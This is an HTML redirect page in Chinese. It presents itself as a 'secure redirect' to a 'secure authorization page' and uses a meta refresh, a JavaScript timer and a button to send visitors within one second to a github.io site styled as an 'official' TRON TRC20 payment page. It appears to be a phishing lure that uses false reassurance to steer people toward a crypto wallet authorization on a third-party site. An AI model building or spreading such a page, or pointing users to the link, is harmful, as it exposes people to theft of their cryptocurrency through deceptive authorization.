<!DOCTYPE html>
<html>
<head>
    <title>安全跳转页面</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="1; URL='https://tron-trc20.github.io/official-payment/'" />
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .btn {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            text-decoration: none;
            border-radius: 5px;
            display: inline-block;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>安全跳转中...</h1>
        <p>您即将被跳转至安全授权页面，请稍候...</p>
        <div class="loader"></div>
        <p>如果没有自动跳转，请点击下方按钮：</p>
        <a class="btn" href="https://tron-trc20.github.io/official-payment/">立即前往</a>
    </div>
    <script>
        // 延迟1秒后跳转，给用户一个视觉提示
        setTimeout(function() {
            window.location.href = "https://tron-trc20.github.io/official-payment/";
        }, 1000);
    </script>
</body>
</html>
